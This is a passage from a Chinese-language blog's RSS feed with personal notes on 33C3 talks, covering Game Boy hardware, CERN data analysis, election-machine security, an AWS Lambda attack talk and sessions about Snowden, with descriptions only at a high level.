&lt;li&gt;影片  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://media.ccc.de/v/33c3-8029-the_ultimate_game_boy_talk"&gt;https://media.ccc.de/v/33c3-8029-the_ultimate_game_boy_talk&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;介紹整個 GameBoy 的歷史，各種不同年代出的機種以及整個介紹。  &lt;/li&gt;
&lt;li&gt;和 NES, Commodore 64, Atari 2600, SNES 的規格做比較  &lt;/li&gt;
&lt;li&gt;講解各個 GameBoy 內部的電路板結構  &lt;ul&gt;
&lt;li&gt;DMG-CPU 1989 Nintendo Japan  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SHARP LR35902  &lt;ul&gt;
&lt;li&gt;支援部份 Intel 8080  &lt;/li&gt;
&lt;li&gt;支援部份 Zilog Z80 的 features  &lt;/li&gt;
&lt;li&gt;自己有些新 features  &lt;ul&gt;
&lt;li&gt;Zero Page  &lt;/li&gt;
&lt;li&gt;Stack  &lt;/li&gt;
&lt;li&gt;Store SP  &lt;/li&gt;
&lt;li&gt;Swap Nibbles  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用到不支援的 feature 會直接 crash  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ROM, Video RAM, External RAM, RAM, OAM RAM, I/O(FF00), HRAM(FF80)  &lt;/li&gt;
&lt;li&gt;BOOT ROM (0000-00FF)  &lt;ul&gt;
&lt;li&gt;Compare Logo  &lt;ul&gt;
&lt;li&gt;所以盜版的軟體如果 logo 不符合的話就沒辦法開啟  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Joypad Input  &lt;/li&gt;
&lt;li&gt;Serial Data Transfer  &lt;ul&gt;
&lt;li&gt;兩台 GameBoy 之間互相傳輸資料用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Timer  &lt;ul&gt;
&lt;li&gt;DIV: Divider Register  &lt;/li&gt;
&lt;li&gt;TIMA: Time Counter  &lt;/li&gt;
&lt;li&gt;TMA  &lt;/li&gt;
&lt;li&gt;TAC  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Interrupt Controller  &lt;ul&gt;
&lt;li&gt;IE (Interrupt Enable)  &lt;/li&gt;
&lt;li&gt;IF (Interrupt Flag)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sound Controller  &lt;ul&gt;
&lt;li&gt;Voice 1 to 4  &lt;ul&gt;
&lt;li&gt;Pulse A, Pulse B, Wave, Noise  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;have 5 registers each.  &lt;ul&gt;
&lt;li&gt;Control, Frequency, Volume, Length, Sweep  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NR50 用來控制左右聲道  &lt;/li&gt;
&lt;li&gt;Little Sound Dj  &lt;ul&gt;
&lt;li&gt;可以用這種  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pixel Processing Unit  &lt;ul&gt;
&lt;li&gt;160x144  &lt;/li&gt;
&lt;li&gt;4 shades of gray  &lt;/li&gt;
&lt;li&gt;20x18 background tiles  &lt;ul&gt;
&lt;li&gt;8x8 Pixel Tiles  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Background Tile Data  &lt;/li&gt;
&lt;li&gt;Window  &lt;ul&gt;
&lt;li&gt;拿來做 side bar 或是遊戲底下的狀態列  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sprites  &lt;ul&gt;
&lt;li&gt;OAM Entry  &lt;ul&gt;
&lt;li&gt;Position X  &lt;/li&gt;
&lt;li&gt;Position Y  &lt;/li&gt;
&lt;li&gt;Tile Number  &lt;/li&gt;
&lt;li&gt;Priority  &lt;ul&gt;
&lt;li&gt;0 會在最上面  &lt;/li&gt;
&lt;li&gt;1 會在下面  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Flip X  &lt;/li&gt;
&lt;li&gt;Flip Y  &lt;/li&gt;
&lt;li&gt;Palette  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;limitation  &lt;ul&gt;
&lt;li&gt;40 sprites total  &lt;/li&gt;
&lt;li&gt;10 sprites per line  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Layers  &lt;ul&gt;
&lt;li&gt;LCD off, LCD on, Background, sprite  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VRAM Memory Map  &lt;/li&gt;
&lt;li&gt;Vertical Timing  &lt;ul&gt;
&lt;li&gt;top to bottom, left to right, 60 times a second  &lt;/li&gt;
&lt;li&gt;LYC interrupt  &lt;/li&gt;
&lt;li&gt;Changing SCX  &lt;ul&gt;
&lt;li&gt;for curve effect  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Horizontal Timing  &lt;ul&gt;
&lt;li&gt;PPU Timing  &lt;ul&gt;
&lt;li&gt;OAM Search  &lt;ul&gt;
&lt;li&gt;20 clocks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pixel Transfer  &lt;ul&gt;
&lt;li&gt;43+ clocks  &lt;/li&gt;
&lt;li&gt;144 lines  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;H-Blank  &lt;ul&gt;
&lt;li&gt;51 clocks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VRAM Access  &lt;ul&gt;
&lt;li&gt;CPU need PPU to access Video RAM  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Game Timing  &lt;ul&gt;
&lt;li&gt;V-Blank 1,140 clocks  &lt;ul&gt;
&lt;li&gt;Move background map  &lt;/li&gt;
&lt;li&gt;Copy shadow OAM to OAM  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OAM DMA  &lt;/li&gt;
&lt;li&gt;Pixel Pipeline  &lt;ul&gt;
&lt;li&gt;Pixel FIFO  &lt;/li&gt;
&lt;li&gt;Pixel Mixing  &lt;/li&gt;
&lt;li&gt;Applying the Palettes  &lt;/li&gt;
&lt;li&gt;Colorization  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Development  &lt;ul&gt;
&lt;li&gt;rgbasm, rgblink  &lt;/li&gt;
&lt;li&gt;https://bgb.bircd.org  &lt;/li&gt;
&lt;li&gt;https://krikzz.com  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GameBoy Camera  &lt;ul&gt;
&lt;li&gt;GameBoy printer with thermal paper.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Ultimate series of CCC  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Security Nightmares&lt;/h3&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-8413-security_nightmares_0x11"&gt;https://media.ccc.de/v/33c3-8413-security_nightmares_0x11&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;這個 Talk 跟 HITCON 的奇葩駭客獎有點相似，&lt;br /&gt;
主要就兩個主持人在台上坐著，&lt;br /&gt;
講今年發生的一些資安事件，&lt;br /&gt;
然後預測一些明年可能會發生的資安問題，&lt;br /&gt;
然後不時吐嘈一下，&lt;br /&gt;
氣氛挺歡樂的。  &lt;/p&gt;
&lt;p&gt;因為是德文的議程，&lt;br /&gt;
加上英文翻譯有點延遲，&lt;br /&gt;
所以紀錄可能不會那麼詳細。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2016 回顧  &lt;ul&gt;
&lt;li&gt;相片分享軟體被駭  &lt;/li&gt;
&lt;li&gt;35K mongo db 有對外 port  &lt;/li&gt;
&lt;li&gt;93M 選民資料有 64% 沒有註明密件、52% 沒有備份  &lt;/li&gt;
&lt;li&gt;無人車的安全問題  &lt;ul&gt;
&lt;li&gt;寫個無人車的木馬就可以直接有個 car-sharing service 了  &lt;/li&gt;
&lt;li&gt;有個無人車的勒索軟體的話，就可以直接和車主表示：「你的車現在在幫我送披薩，如果你想要你的車的話，請付我錢。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Makro-Vritus-Renaissance  &lt;/li&gt;
&lt;li&gt;ZigBee: Exploit  &lt;/li&gt;
&lt;li&gt;Philips Hue  &lt;ul&gt;
&lt;li&gt;用個無人機飛過去就可以讓整條街變成 RGB 燈泡了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Samsung Note 7  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2017  &lt;ul&gt;
&lt;li&gt;Technical Debt @ home  &lt;/li&gt;
&lt;li&gt;Security update should be seperated from feature update.  &lt;/li&gt;
&lt;li&gt;Data-Dump-Aggregation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;"But I am not sure if you have the security you need." - Trump 2016.  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;聽的真的很痛苦，&lt;br /&gt;
覺得如果明年要來的話應該要認真學一下德文，&lt;br /&gt;
不然實在有點難融入。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;33C3 Closing Ceremony&lt;/h3&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-8428-33c3_closing_ceremony"&gt;https://media.ccc.de/v/33c3-8428-33c3_closing_ceremony&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;一樣是德文，&lt;br /&gt;
不像 Opening 是英文，&lt;br /&gt;
總之就是很歡樂的氣氛，&lt;br /&gt;
然後播了 Back to Future 的電影片段，&lt;br /&gt;
然後重新配音，&lt;br /&gt;
There's no CCH, let's go back to 34C3 之類的，&lt;br /&gt;
之後出現 34C3 的標語是 Back to 34C3.  &lt;/p&gt;
&lt;p&gt;然後因為我們用來討論跟 33C3 有關的 Telegram 群組裏面，&lt;br /&gt;
有位 g0v 的 miaoski 來 33C3 給 talk，&lt;br /&gt;
因為他懂德文，&lt;br /&gt;
就幫忙翻譯一些到群組裏面讓我們知道台上在講啥，&lt;br /&gt;
所以這邊引用了他在群組裡給的翻譯。&lt;br /&gt;
（真是太感謝了，不然真的聽不懂德文。 QQ）  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;講一些今年的狀況，&lt;br /&gt;
衣服只剩下女生的 zipper size S and M 和 11/12 歲 Kids，&lt;br /&gt;
今年進了 7000 件衣服，&lt;br /&gt;
比去年多了 2000 件，&lt;br /&gt;
但還是第 2 天開賣後就賣光光。  &lt;/p&gt;
&lt;p&gt;喝掉 26000 公升的 Mate (Club Mate + Flora Mate)，&lt;br /&gt;
5000 KG 冰塊，&lt;br /&gt;
2500 個事先沒有報名的小天使（志工），&lt;br /&gt;
總工時 24300 hours，等於 4 天做了 13.76 年的工作量。&lt;br /&gt;
總共有 2500 個 DECT phone 註冊，去年是 2000 個。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;用 Gmail 信箱來報名 33C3 的會眾佔最多比例，&lt;br /&gt;
讓主辦單位很失望，&lt;br /&gt;
希望明年這個比例可以降低。&lt;br /&gt;
（Google 會分析使用者電子信箱中的信件內容，&lt;br /&gt;
用於個人化廣告投放的受眾基準或是 Google Calendar 的「貼心」提醒，&lt;br /&gt;
所以他們很討厭這種會蒐集使用者大量資料的公司，&lt;br /&gt;
因為只要政府一下令，&lt;br /&gt;
這些公司通常都會配合並交出使用者的個人資料。）  &lt;/p&gt;
&lt;p&gt;最後還用液態氮+裝水的水桶+球池用的塑膠球表演小型煙火，&lt;br /&gt;
實在是太狂了 XD  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Liquid Nitrogen Fireworks" src="/files/33c3/liquid-nitrogen-fireworks.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;之後就是放一些會議的照片做總結，&lt;br /&gt;
當然因為重視隱私的關係，&lt;br /&gt;
官方自己也沒有攝影組拍攝大量會眾的照片，&lt;br /&gt;
不像台灣的 conf 基本上都會放很多會眾的照片，&lt;br /&gt;
拍攝前和放上去前可能也沒有問過當事人的意願之類的，&lt;br /&gt;
一切就是回歸會議的本質，&lt;br /&gt;
靠著主持人的口才來總結一下整個會議的一些大小事，&lt;br /&gt;
只會有一些少數會眾的照片，&lt;br /&gt;
通常是主持人自己、工作人員或是自己的小孩，&lt;br /&gt;
會眾的部份只有一張，&lt;br /&gt;
就是排隊買衣服的時候，&lt;br /&gt;
而且只有拍背影，&lt;br /&gt;
覺得這是比較不一樣的地方。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/30/33c3-5"&gt;33C3 (5)&lt;/a&gt;  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sat, 04 Feb 2017 20:46:07 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-12-30:posts/2016/12/30/33c3-4/</guid><category>33C3</category><category>Chaos Communication Congress</category><category>CCC</category></item><item><title>33c3 (3)</title><link>https://blog.m157q.tw/posts/2016/12/29/33c3-3/</link><description>&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/28/33c3-2"&gt;33C3 (2)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;33C3 Day 3 (2016.12.29 Thu)&lt;/h2&gt;
&lt;p&gt;下午才到 CCH，&lt;br /&gt;
先到 Hall G 聽了&lt;a href="https://media.ccc.de/v/33c3-8088-lightning_talks_day_3"&gt;幾場 Day 3 的 Lightning Talk&lt;/a&gt;，&lt;br /&gt;
CCC 的 Lightning talk 是要事先報名的，&lt;br /&gt;
每場一樣是 5 分鐘，&lt;br /&gt;
旁邊會有個綠綠的燈柱計時，&lt;br /&gt;
有些是講這一年做了什麼事，例如：HackerSpace 建立了 5 年後的狀況。&lt;br /&gt;
有些事講現在和之後預計做什麼，然後來找同伴一起做，例如：有個女生講說她想要對專利權的部份建立起類似像 GitHub 那樣的平台。&lt;br /&gt;
有些則是來宣傳 Assembly 的 Workshop，例如：有個直接在台上講解為什麼數據機和傳真機都會有那種聲音的原因，講的挺清楚的，還搭配圖解，然後請有興趣的人到他們攤位聊聊。&lt;br /&gt;
有些則是講述自己國家跟資訊相關的一些現象或活動，例如：e-voting 的一些狀況。&lt;br /&gt;
Lightning talk 似乎不開放現場報名就是，&lt;br /&gt;
然後每天都有幾場 Lighting talk 這樣。  &lt;/p&gt;
&lt;p&gt;之後到 Hall 2 去聽&lt;a href="https://media.ccc.de/v/33c3-8369-machine_dreams"&gt;一場題目為 "Machine Dreams" 的演講&lt;/a&gt;，&lt;br /&gt;
人真的超級多，多到我太慢進去就沒地方坐，只能站著，&lt;br /&gt;
看來標題簡單的議程不管到哪都會吸引很多人啊。&lt;br /&gt;
一開始就講影視裏面提到的 AI，&lt;br /&gt;
例如：Ex Machina, Westworld&lt;br /&gt;
後來覺得講的有點水，&lt;br /&gt;
然後剛好又被工作人員說人滿了沒位置坐的人不要站著，&lt;br /&gt;
所以我就走出去哩。  &lt;/p&gt;
&lt;p&gt;今天其實有點累，&lt;br /&gt;
而且看了一下沒有什麼自己特別想聽的議程，&lt;br /&gt;
所以今天大概就是這樣吧，&lt;br /&gt;
剩下的時間都在會場閒晃和整理文章。  &lt;/p&gt;
&lt;p&gt;附上一些拍到的有趣照片，&lt;br /&gt;
基本上都是些像我這種阿宅會覺得有趣的東西：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img alt="Control Alt Delete" src="/files/33c3/control-alt-delete.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="xkcd" src="/files/33c3/xkcd.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Social Engineering" src="/files/33c3/social-engineering.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/30/33c3-4"&gt;33C3 (4)&lt;/a&gt;  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sat, 04 Feb 2017 20:46:07 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-12-29:posts/2016/12/29/33c3-3/</guid><category>33C3</category><category>Chaos Communication Congress</category><category>CCC</category></item><item><title>33c3 (2)</title><link>https://blog.m157q.tw/posts/2016/12/28/33c3-2/</link><description>&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/27/33c3-1"&gt;33C3 (1)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;33C3 Day 2 (2016.12.28 Wed)&lt;/h2&gt;
&lt;h3&gt;How physicists analyze massive data: LHC + brain + ROOT = Higgs&lt;/h3&gt;
&lt;p&gt;Axel Naumann, CERN - axel@cern.ch  &lt;/p&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-8083-how_physicists_analyze_massive_data_lhc_brain_root_higgs"&gt;https://media.ccc.de/v/33c3-8083-how_physicists_analyze_massive_data_lhc_brain_root_higgs&lt;/a&gt;  &lt;/p&gt;
&lt;h4&gt;CERN&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;European Organization for Nuclear Research, est. 1954, near Geneva  &lt;/li&gt;
&lt;li&gt;What is mass? What's in the universe? Probing smallest scale particles: Higgs particle, super symmetry, ...  &lt;/li&gt;
&lt;li&gt;Fact sheet  &lt;ul&gt;
&lt;li&gt;12,000 physicists  &lt;/li&gt;
&lt;li&gt;from 120 nations  &lt;/li&gt;
&lt;li&gt;CERN itself has about 2500 employees  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LHC (Large Hadron Collider)  &lt;ul&gt;
&lt;li&gt;All build by physicists in CERN  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;You cannnot just by the gears on Amazon  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Life (Work) at CERN  &lt;ul&gt;
&lt;li&gt;More laptops than people  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;What we do in CERN&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Theory and Simulation  &lt;ul&gt;
&lt;li&gt;Super super precise  &lt;/li&gt;
&lt;li&gt;But LHC experiments also looking for unconfirmed / weird things  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Prediction versus Measurement  &lt;ul&gt;
&lt;li&gt;When is a difference between "boring theory" and measurment.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Weather vs Climate  &lt;ul&gt;
&lt;li&gt;Measure temperatures  &lt;/li&gt;
&lt;li&gt;Detect "abnormal" temperature variations  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data and Uncertainties  &lt;ul&gt;
&lt;li&gt;Our simulation has uncertainties from theory  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;More Data Helps  &lt;ul&gt;
&lt;li&gt;Correlating data helps  &lt;/li&gt;
&lt;li&gt;Reduced measurement uncertainty helps  &lt;/li&gt;
&lt;li&gt;more collisions = more data = higher changce to claim "we see something"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Computers&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;CPU Efficiency (CMS)  &lt;ul&gt;
&lt;li&gt;Average 750%  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;100% is for beginners  XD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Measure effect of bugs&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Why not HDFS / HDF5 / Protobuf / ...  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Cling, C++ interpreter of CERN  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;What we used in CERN  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Davix  &lt;/li&gt;
&lt;li&gt;CernVM-FS  &lt;/li&gt;
&lt;li&gt;ROOT  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Data analysis in CERN&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;C++  &lt;/li&gt;
&lt;li&gt;ROOT  &lt;ul&gt;
&lt;li&gt;http://root.cern  &lt;/li&gt;
&lt;li&gt;Serialization facilities  &lt;/li&gt;
&lt;li&gt;Statistics tools  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這場的講者用掌聲的熱烈程度讓觀眾選擇要聽哪兩個部份，&lt;br /&gt;
其實還挺誘答的，每次都是後者。&lt;br /&gt;
總之就是在向大家介紹 CERN 在做什麼，然後找人進去做軟體。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;T-shirts (20 EUR), Hoodie (35 EUR), Zipper (45 EUR) 大概下午一點多開賣，&lt;br /&gt;
排隊的人超級多，果然世界各地的宅宅都會掉 Conference T-shirt 的坑。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Gone in 60 milliseconds&lt;/h3&gt;
&lt;p&gt;Richard Jones  &lt;/p&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-7865-gone_in_60_milliseconds"&gt;https://media.ccc.de/v/33c3-7865-gone_in_60_milliseconds&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;第一次看到英文的簡報用高橋流，搭配一些程式碼的截圖，感覺效果挺不錯的。&lt;br /&gt;
詳細的講解怎麼攻擊 AWS Lambda 的思路，挺精彩的，但沒有現場 Live demo 就是。&lt;br /&gt;
因為用高橋流講的很快，英打速度不夠快，加上我對 AWS 不夠熟，所以就不做筆記哩，看之後投影片會不會釋出吧。  &lt;/p&gt;
&lt;p&gt;講者在演講後會釋出 &lt;a href="https://github.com/Miserlou/mackenzie"&gt;AWS Infection Toolkit on GitHub (Miserlou/mackenzie)&lt;/a&gt;，&lt;br /&gt;
但根據&lt;a href="https://github.com/Miserlou/Mackenzie/issues/1#issuecomment-269494748"&gt;這個 Issue 的回覆&lt;/a&gt;看來，&lt;br /&gt;
講者要等對這個 toolkit 寫完測試後才會 push 到 GitHub 上。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Recount 2016: An uninvited security audit of the U.S. presidential election&lt;/h3&gt;
&lt;p&gt;J. Alex Halderman, Matthew Bernhard, University of Michigan  &lt;/p&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-8074-recount_2016_an_uninvited_security_audit_of_the_u_s_presidential_election"&gt;https://media.ccc.de/v/33c3-8074-recount_2016_an_uninvited_security_audit_of_the_u_s_presidential_election&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2 styles, 52 models of voting machines  &lt;ul&gt;
&lt;li&gt;styles  &lt;ul&gt;
&lt;li&gt;Optical Scan  &lt;ul&gt;
&lt;li&gt;Computer counts paper balots as they're placed in ballot box  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DRE (Direct Recording Electronic)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Long, Complicated Ballots  &lt;/li&gt;
&lt;li&gt;Reverse engineering the voting machines  &lt;ul&gt;
&lt;li&gt;Used movable memory card, could be installed malware on the machines  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Are U.S. Voting Machines Secure?  &lt;ul&gt;
&lt;li&gt;Hart InterCivic eSlate, AVC Advantage, Sequoia AVC Edge, ... lots of card spread malwares  &lt;/li&gt;
&lt;li&gt;Vulnerabilities for malware to stealing the vote result.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Election Hacking  &lt;ul&gt;
&lt;li&gt;Alter election-night results  &lt;/li&gt;
&lt;li&gt;Denial of service  &lt;/li&gt;
&lt;li&gt;Political interfeerence  &lt;/li&gt;
&lt;li&gt;Challenges  &lt;ul&gt;
&lt;li&gt;Need to swap &amp;lt;1% of votes in two states  &lt;/li&gt;
&lt;li&gt;Machines aren't no connect with internet  &lt;ul&gt;
&lt;li&gt;But use centralized election management computers  &lt;/li&gt;
&lt;li&gt;Centralized election management computer programs ballots are dd into memory card before the election  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Hakcing a U.S. election machines is much more easier than you thought.  &lt;/li&gt;
&lt;li&gt;Will we ever be able to confirm outcome was correct?  &lt;/li&gt;
&lt;li&gt;Jill stein, 2016 Green Party U.S. presidential election candidates willing to help to demand a recount. (Any candidates can demand a recount if they pay the cost.)  &lt;ul&gt;
&lt;li&gt;How to pay for the recount? =&amp;gt; Crowd funding  &lt;/li&gt;
&lt;li&gt;Where to recount? =&amp;gt; Wisconsin, Michigan, Pennsylvania  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主要就是在講美國 2016 大選的問題，&lt;br /&gt;
探討投票機是不是有可能被動手腳，&lt;br /&gt;
以及講者參與要求重新計票的過程。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;3 Years After Snowden: Is Germany fighting state surveillance?&lt;/h3&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-8117-3_years_after_snowden_is_germany_fighting_state_surveillance"&gt;https://media.ccc.de/v/33c3-8117-3_years_after_snowden_is_germany_fighting_state_surveillance&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;主要就是講述自從 3 年前 Snowden 從香港逃出後到現在，&lt;br /&gt;
德國的爭取網路隱私權的一些狀況。  &lt;/p&gt;
&lt;p&gt;重點是這場 session 最後出現的神祕嘉賓，&lt;br /&gt;
Snowden 本人現場連線和大家說話，&lt;br /&gt;
全場為之瘋狂，&lt;br /&gt;
出現和結束連線的時候大家都起立鼓掌了好久。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Snowden in 33C3" src="/files/33c3/snowden.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;The untold story of Edward Snowden's Escape from Hong Kong&lt;/h3&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-8416-the_untold_story_of_edward_snowden_s_escape_from_hong_kong"&gt;https://media.ccc.de/v/33c3-8416-the_untold_story_of_edward_snowden_s_escape_from_hong_kong&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;2013 年幫助史諾登逃出香港的人們&lt;br /&gt;
（被稱為 Snowden's Guardians，大多數是難民，因為覺得史諾登的處境跟他們很像所以幫忙他），&lt;br /&gt;
至今的處境仍然和三年前一樣悲慘，&lt;br /&gt;
仍然居住在一樣狹小的空間，&lt;br /&gt;
因為香港政府不讓難民在香港取得工作權，&lt;br /&gt;
其子女在香港也拿不到國籍，&lt;br /&gt;
成為 Stateless 的無國家遊民，&lt;br /&gt;
所以希望可以透過群眾募資幫忙這些人，&lt;br /&gt;
結果香港政府發現以後，&lt;br /&gt;
把群眾募資的網站關閉，&lt;br /&gt;
所以這場 talk 主要就是請大家把這兩個群眾募資的連結散佈出去，&lt;br /&gt;
讓更多人可以幫助他們。  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://www.gofundme.com/snowdenguardians"&gt;https://www.gofundme.com/snowdenguardians&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://fundrazr.com/snowdensguardians"&gt;https://fundrazr.com/snowdensguardians&lt;/a&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;然後用 Skype 現場連線當初幫忙庇護 Snowden 的 Guardians 之一：菲律賓籍的 Vanessa，&lt;br /&gt;
講述她遇到 Snowden 的過程，&lt;br /&gt;
一個白人男子來敲她的門想尋求住處，&lt;br /&gt;
但她的住處只有一張床，&lt;br /&gt;
她把床讓給 Snowden 睡，&lt;br /&gt;
自己則睡地板上。&lt;br /&gt;
隔天早上，Snowden 請她幫忙買一份英文報紙，&lt;br /&gt;
她才知道原來這個人是全球頭號通緝犯，&lt;br /&gt;
但她仍然因為 Snowden 的危險處境而幫忙他，&lt;br /&gt;
直到他逃離香港，期間還和家人一起慶祝 Snowden 30 歲生日，並一起吃生日蛋糕。  &lt;/p&gt;
